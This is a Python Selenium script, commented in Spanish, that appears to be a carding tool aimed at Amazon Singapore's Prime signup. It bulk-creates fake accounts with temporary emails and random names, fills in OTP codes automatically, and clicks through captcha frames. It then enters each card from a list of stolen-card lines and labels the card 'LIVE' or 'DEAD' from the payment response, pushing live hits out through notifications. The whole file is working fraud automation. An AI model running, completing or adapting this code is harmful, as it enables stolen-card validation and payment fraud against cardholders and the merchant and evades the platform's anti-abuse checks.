from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from time import sleep
import threading
from notify_run import Notify
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from colorama import *
from playsound import playsound
from selenium.common.exceptions import *
import random
import requests
import re
import names
import sys

#Crea el Email
def tempmail():

    browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue

    global correitotemp
    mailll = browser221.find_element_by_id("userName")
    tempmail1 = mailll.get_attribute("value")
    correitotemp = tempmail1+"@hasevo.com"
    print("CREATING EMAIL  ...")

#Separa los datos de la cc
def crearlinea():
    global ccs
    file = [s.rstrip() for s in ccs]
    for lines in file:
        cc = lines.split("|")
        global cc1
        global mes
        global anio
        global cvv
        cc1 = cc[0]
        mes = cc[1] 
        anio = cc[2]
        cvv = cc[3]

def remover_ultima():
    global indice_ultima
    global ccs
    ccs.pop(indice_ultima)
    indice_ultima -= 1

def generargmail(email):
    global email2
    x = random.randint(1, 200000)
    email1 = email.split("@")
    email2 = email1[0] + "+" + str(x) + "@" + email1[1]
    print(Fore.GREEN + email2)

def pagar():
    driver.find_element(By.XPATH, '//*[@id="a-autoid-0"]/span/input').click()
    timer1 = threading.Timer(4, verificar)     
    timer1.start()
def recheck():
    driver.find_element_by_css_selector(".pmts-link-button[value='Change']").click()
    sleep(2)
    element = driver.find_element(By.CLASS_NAME, 'a-size-base')
    element.click()
    timer4 = threading.Timer(5, refill)
    timer4.start()
def buttonsfill():
    driver.find_element(By.NAME, 'ppw-widgetEvent:SelectAddressEvent').click()
    sleep(3)
    driver.find_element(By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent').click()
    timer3 = threading.Timer(3, pagar)
    timer3.start()
def refill():
    driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(cc1)
    driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(mes)
    driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(anio)
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
    timer5 = threading.Timer(3, buttonsfill)
    timer5.start()
def verificar():
    bodyText = driver.find_element_by_tag_name('body').text
    if "There was an error validating your payment method. Please update or add a new payment method and try again." in bodyText:
        print(Fore.RED + " DEAD " + cc1 +"|"+ mes +"|"+anio +"|" + cvv )
        remover_ultima()
        crearlinea()
        timer2 = threading.Timer(4, recheck)
        timer2.start()
    elif "You can now enjoy FREE delivery on millions of Prime eligible items, stream thousands of movies and TV episodes on Prime Video, get free in game content with Twitch Prime and more." in bodyText:
        playsound('HIT.wav')
        print(Fore.GREEN + " LIVE " + cc1 +"|"+ mes +"|"+anio +"|" + cvv )
        notify = Notify()
        notify.send(" LIVE " + cc1 +"|"+ mes +"|"+anio +"|" + cvv) 
        

def fillcc1():
    #DATACC
    driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(cc1)
    driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(mes)
    driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(anio)
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
    print(Fore.BLUE +"ADDING CC")
    timer7 = threading.Timer(4, filladress)
    timer7.start()

def filladress():
#DATA ADRESS AND PAY
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressFullName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPhoneNumber').send_keys("63682066")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPostalCode').send_keys("757724")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressLine1').send_keys("1 Woodlands Industrial Park E1 #03-02")
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddAddressEvent').click()
    print(Fore.BLUE + "ADDING ADDRESS")
    pagar()

#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------

def otpcode():
    
    codiguito = browser221.find_element_by_class_name("otp")
    codiguito2 = codiguito.text
    print(Fore.CYAN +"OTP SOLVED: ")
    driver.find_element(By.NAME, 'code').send_keys(codiguito2)
    driver.find_element(By.CLASS_NAME, 'a-button-input').click()
    browser221.quit()

    WebDriverWait(driver, 120).until(EC.presence_of_element_located((By.ID, "twotabsearchtextbox")))
    
def error_register():

    global nerror    
    bodyText0 = driver.find_element_by_tag_name('body').text

    #Lee los mensajes de erro y si no hay pasa al otp
    if "Internal Error. Please try again later." in bodyText0:
        if nerror == 3:
            print(Fore.RED, "Error al llenar el formulario")
            return False
        else:
            nerror += 1
            print(Fore.RED + "CAMBIAR CORREO")
            browser221.get("https://tempm.com/hasevo.com") #Carga la web
            tempmail()  #Extrae datos del mail
            driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")
            registroamazon()
    elif "Solve this puzzle to protect your account" in bodyText0:
        print(Fore.YELLOW + "CAPTCHA FOUND, NEXT TIME CHANGE IP")
        print(Fore.BLUE + "WAIT UNTIL CAPTCHA SOLVED")
        return True
    elif "Verify email address" in bodyText0: 
        try:
            timer6 = threading.Timer(5, otpcode())
            timer6.start()
        except:
            return False
        return True

    else:
        sleep(3)
        error_register()
    

def registroamazon():

    print(Fore.CYAN +"SIGNING UP ACCOUNT ")
    driver.implicitly_wait(30)  #Delay

    #Click para registrarse
    driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

    #Llena el formulario de registro
    driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
    driver.find_element(By.NAME, 'email').send_keys(correitotemp)
    driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
    driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
    driver.find_element(By.XPATH, '//*[@id="continue"]').click()

    #espera a que cargue la ventana de captcha
    driver.implicitly_wait(10)
    er = error_register()    #Revisa si hay errores en el formulario
    if er != False:
        # Cambia el foco al iframe
        driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
        driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
        driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="CaptchaFrame"]'))         #Tercer frame
        # Ahora podemos hacer clic en el botón'
        driver.find_element(By.XPATH, '//*[@id="home_children_button"]').click()
        driver.switch_to.default_content()
        
        #Espera respuestas al aceptar el captcha
        WebDriverWait(driver, 120).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
        er = error_register()    #Revisa si hay errores en el formulario
        if er != False:

            pass
        
        else:
            print(Fore.RED, "Tiempo de espera de OTP number extendido")

def webdriver_chromeoptions():
    global chrome_options
    #Inica el API WEBDRIVER CHROME para ajustar las opciones
    chrome_options = webdriver.ChromeOptions()
    
    # Agrega los opciones del navegador
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--disable-dev-shm-usage')
    #chrome_options.add_argument("--headless")                  #Ocultar navegador
    chrome_options.add_argument("--window-size=800,600")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-popup-blocking")


#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------

# main 
if __name__ == "__main__":
    
    init()      # Inicializa todos las referencias como paquetes
    #sys.tracebacklimit = 0     #Manejo de excepciones
    
    try:
       
        #Carga el archivo cc.txt
        ccs = open("cc.txt", "r+").readlines()
        indice_ultima = len(ccs) - 1

        webdriver_chromeoptions()   #Carga las opciones del navegador y retorna las opciones

        browser221 = webdriver.Chrome('chromedriver', options=chrome_options)   #Crea la interfaz con las opciones
        browser221.get("https://tempm.com/hasevo.com") #Carga la web
        tempmail()  #Extrae datos del mail

        driver = webdriver.Chrome('chromedriver', options=chrome_options)   #Crea interfaz con las opciones
        driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")  #Carga la web 
        nerror = 0          #Contador de errores que se usa en error_register()
        registroamazon()    #Se registra en amazon

        crearlinea()    #Toma una linea de cc.txt

    except WebDriverException:
        print(Fore.RED, "Error al conectar a la red")
    